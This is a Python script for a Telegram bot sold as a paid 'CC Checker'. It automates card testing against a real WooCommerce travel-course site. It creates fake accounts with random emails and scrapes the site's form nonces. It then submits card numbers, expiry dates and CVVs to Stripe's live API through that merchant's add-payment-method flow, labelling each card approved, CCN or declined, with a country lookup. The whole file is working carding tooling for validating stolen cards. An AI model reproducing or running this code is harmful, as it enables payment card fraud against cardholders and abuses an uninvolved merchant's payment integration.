from datetime import datetime, timedelta
from bs4 import BeautifulSoup
import json
import sys
import re
import random
import string
import os
import time
import requests
import csv
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Telegram Bot Token
TELEGRAM_TOKEN = input('TOKEN YOUR BOT : ')
ADMIN_USER_ID = 7975278941
# Banner
bannerss = """
                    
 ▗▄▄▖▗▖ ▗▖▗▄▄▄▖ ▗▄▄▖▗▖ ▗▖▗▄▄▄▖▗▄▄▖ 
▐▌   ▐▌ ▐▌▐▌   ▐▌   ▐▌▗▞▘▐▌   ▐▌ ▐▌
▐▌   ▐▛▀▜▌▐▛▀▀▘▐▌   ▐▛▚▖ ▐▛▀▀▘▐▛▀▚▖
▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▐▌ ▐▌
                                   
                                   
 | Version: 1.2
PAID VERSION! BY @oldxldark
"""

# Required modules
required_modules = ["requests", "bs4", "re", "json", "random", "string", "datetime", "csv"]

# Function to display banner
def display_banner():
    print_red(bannerss)

# Function to print colored text
def print_red(text):
    print(f"\033[91m{text}\033[0m")

def print_green(text):
    print(f"\033[92m{text}\033[0m")

def print_yellow(text):
    print(f"\033[93m{text}\033[0m")

# Function to check if required modules are installed
def check_modules(modules):
    for module in modules:
        try:
            __import__(module)
        except ImportError:
            print(f"The required module '{module}' is not installed. (Run `pip install {module}`)")
            sys.exit(1)

# Function to create a session
def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']

        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        }

        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', f'{email}'),
            ('password', 'Esahatam2009@'),
            ('wc_order_attribution_source_type', 'typein'),
            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
            ('wc_order_attribution_utm_campaign', '(none)'),
            ('wc_order_attribution_utm_source', '(direct)'),
            ('wc_order_attribution_utm_medium', '(none)'),
            ('wc_order_attribution_utm_content', '(none)'),
            ('wc_order_attribution_utm_id', '(none)'),
            ('wc_order_attribution_utm_term', '(none)'),
            ('wc_order_attribution_utm_source_platform', '(none)'),
            ('wc_order_attribution_utm_creative_format', '(none)'),
            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
            ('wc_order_attribution_session_pages', '8'),
            ('wc_order_attribution_session_count', '1'),
            ('wc_order_attribution_user_agent', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
            ('woocommerce-register-nonce', f'{noncee}'),
            ('_wp_http_referer', '/register/'),
            ('register', 'Register'),
        ]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(email + ':' + 'Esahatam2009@')
            return session
        else:
            return None
    except Exception as e:
        return None

# Function to generate a random email
def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

# Function to check credit cards
def check_credit_cards(cc_list, session):
    # Load BIN data
    bin_to_country = {}
    try:
        with open('bin_data.csv', 'r') as f:
            reader = csv.reader(f)
            for row in reader:
                if not row:
                    continue
                bin_full = row[0].strip()
                if len(bin_full) >= 6:
                    bin = bin_full[:6]
                    country = row[-1].strip()
                    bin_to_country[bin] = country
    except FileNotFoundError:
        print_red("Error: bin_data.csv not found. Country lookup disabled.")
        bin_to_country = {}

    start_time = time.time()
    total = len(cc_list)
    hit = 0
    dec = 0
    ccn = 0
    countries = []
    results = []
    for cc in cc_list:
        try:
            card = cc.replace('/', '|')
            lista = card.split("|")
            cc_num = lista[0]
            mm = lista[1]
            yy = lista[2]
            if "20" in yy:
                yy = yy.split("20")[1]
            cvv = lista[3]
            
            # Extract BIN and get country
            bin = cc_num[:6]
            country = bin_to_country.get(bin, 'Unknown')

            headers = {
                'authority': 'www.thetravelinstitute.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-US,en;q=0.9',
                'referer': 'https://www.thetravelinstitute.com/my-account/payment-methods/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            }

            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers, timeout=20)
            html = response.text
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            }

            data = f'type=card&card[number]={cc_num}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
            response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
            res = response.text
            iddd = ''
            if 'error' in res:
                error = response.json()['error']['message']
                if 'code' in error:
                    results.append(f"𝗖𝗖𝗡 ✅: {card} - {error} - Country: {country}")
                    ccn += 1
                else:
                    results.append(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {card} - {error} - Country: {country}")
                    dec += 1
            else:
                iddd = response.json()['id']
                headers = {
                    'authority': 'www.thetravelinstitute.com',
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://www.thetravelinstitute.com',
                    'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                    'sec-ch-ua-mobile': '?1',
                    'sec-ch-ua-platform': '"Android"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
                    'x-requested-with': 'XMLHttpRequest',
                }

                params = {
                    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
                }

                data = {
                    'action': 'create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': iddd,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': nonce,
                }

                response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
                res = response.json()
                if res['success'] == False:
                    error = res['data']['error']['message']
                    if 'code' in error:
                        results.append(f"𝗖𝗖𝗡 ✅: {card} - {error} - Country: {country}")
                        ccn += 1
                    else:
                        results.append(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌: {card} - {error} - Country: {country}")
                        dec += 1
                else:
                    results.append(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅: {card} - Successfull! - Country: {country}")
                    hit += 1
                    countries.append(country)

        except Exception as e:
            results.append(f"Invalid Input: {cc} - Country: Unknown")
            continue

    # Process countries for summary
    unique_countries = list(set(countries))  # Remove duplicates
    country_summary = ', '.join(unique_countries) if unique_countries else 'None'

    processing_time = time.time() - start_time
    minutes = int(processing_time // 60)
    seconds = processing_time % 60
    summary = f"""
[+] Gateway: Single + Mass Stripe Auth + CCN
[~] Total: {total}
[>] Declined: {dec}
[>] Hit: {hit}
[>] CCN: {ccn}
[>] Countries: {country_summary}
[>] by : @oldxldark
[÷] Time: {minutes} min and {seconds:.2f} sec
"""
    return results, summary
user_chat_ids = set() 
# Telegram command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_chat_ids.add(update.message.chat_id)  # Store user/group chat ID
    await update.message.reply_text("Welcome to the CC Checker Bot! Use /chk <cc> to check a single card or /mchk to check multiple cards.")

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_chat_ids.add(update.message.chat_id)  # Store user/group chat ID
    cc = context.args[0]
    session = create_session()
    if session:
        results, summary = check_credit_cards([cc], session)
        await update.message.reply_text("\n".join(results) + "\n" + summary)
    else:
        await update.message.reply_text("Failed to create session.")

async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_chat_ids.add(update.message.chat_id)  # Store user/group chat ID
    message_text = update.message.text
    lines = message_text.split('\n')
    cc_list = [line.strip() for line in lines[1:] if line.strip()][:5]
    
    if not cc_list:
        await update.message.reply_text("Please provide CCs after the command, each on a new line. Max 5 CCs.")
        return
    
    session = create_session()
    if session:
        results, summary = check_credit_cards(cc_list, session)
        response = "\n".join(results) + "\n" + summary
        await update.message.reply_text(response)
    else:
        await update.message.reply_text("Failed to create session.")

async def send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if the user is the admin
    if update.message.from_user.id != ADMIN_USER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return
    if not context.args:
        await update.message.reply_text("Usage: /send <message>")
        return
    
    message = " ".join(context.args)  # Combine all arguments into a single message
    
    # Send the message to all stored users and groups
    for chat_id in user_chat_ids:
        try:
            await context.bot.send_message(chat_id=chat_id, text=message)
        except Exception as e:
            print(f"Failed to send message to {chat_id}: {e}")
    
    await update.message.reply_text(f"Message broadcasted to {len(user_chat_ids)} users/groups.")
# Main function to start the bot
def main():
    display_banner()
    check_modules(required_modules)
    print_green("Starting Telegram Bot...")
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(CommandHandler("mchk", mchk))
    application.add_handler(CommandHandler("send", send))
    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
